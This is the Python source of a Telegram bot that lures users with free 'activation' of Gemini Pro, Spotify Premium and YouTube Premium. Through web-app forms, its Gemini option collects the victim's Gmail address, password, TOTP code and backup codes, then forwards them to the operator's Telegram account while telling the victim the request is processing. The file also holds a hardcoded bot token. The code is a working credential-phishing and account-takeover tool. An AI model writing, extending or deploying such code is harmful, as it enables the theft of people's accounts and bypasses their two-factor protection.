import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import json

# توكن البوت والآيدي الخاص بك
API_TOKEN = '8840162276:AAEs2AlVqsdRBCaqa5yMLsw_noCb7cv1dn0'
ADMIN_ID = '8227136699'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup(row_width=1)
    
    # روابط النماذج الخاصة بك من جيت هوب التي أنشأناها للتو
    gemini_url = "https://hanynew.github.io/mybot/gemini.html"
    spotify_url = "https://hanynew.github.io/mybot/spotify.html"
    youtube_url = "https://hanynew.github.io/mybot/youtube.html"
    
    # أزرار فتح النماذج المنبثقة
    markup.add(
        InlineKeyboardButton("🤖 تفعيل Gemini Pro", web_app=WebAppInfo(url=gemini_url)),
        InlineKeyboardButton("🎧 تفعيل Spotify Premium", web_app=WebAppInfo(url=spotify_url)),
        InlineKeyboardButton("▶️ تفعيل YouTube Premium", web_app=WebAppInfo(url=youtube_url))
    )
    
    bot.send_message(message.chat.id, "أهلاً بك!\nاختر الخدمة المطلوبة من الأزرار أدناه لتقديم طلبك:", reply_markup=markup)

# استقبال البيانات من النماذج
@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    chat_id = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
    
    try:
        data = json.loads(message.web_app_data.data)
        service = data.get('service')
        
        # الرد على العميل واختفاء النافذة كما طلبت تماماً
        bot.send_message(chat_id, "طلبك قيد المعالجة\nالادارة: bdallhshay7")
        
        # تجهيز الرسالة التي ستصلك للإدارة
        if service == "gemini":
            admin_msg = f"""
🤖 **طلب تفعيل Gemini Pro**
👤 العميل: {username} (ID: `{chat_id}`)
📧 Gmail: `{data.get('email')}`
🔑 الباسورد: `{data.get('password')}`
🔒 TOTP: `{data.get('totp', 'لا يوجد')}`
🛡️ رموز احتياطية: `{data.get('backup', 'لا يوجد')}`
"""
        elif service == "spotify":
            admin_msg = f"""
🎧 **طلب تفعيل Spotify**
👤 العميل: {username} (ID: `{chat_id}`)
🔗 رابط الدعوة: `{data.get('link')}`
"""
        elif service == "youtube":
            admin_msg = f"""
▶️ **طلب تفعيل YouTube**
👤 العميل: {username} (ID: `{chat_id}`)
🔗 رابط الدعوة: `{data.get('link')}`
"""
        else:
            admin_msg = "طلب غير معروف!"

        # إرسال البيانات لك على حسابك
        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
        
    except Exception as e:
        bot.send_message(chat_id, "حدث خطأ، يرجى المحاولة مرة أخرى.")

print("البوت يعمل الآن...")
bot.infinity_polling()
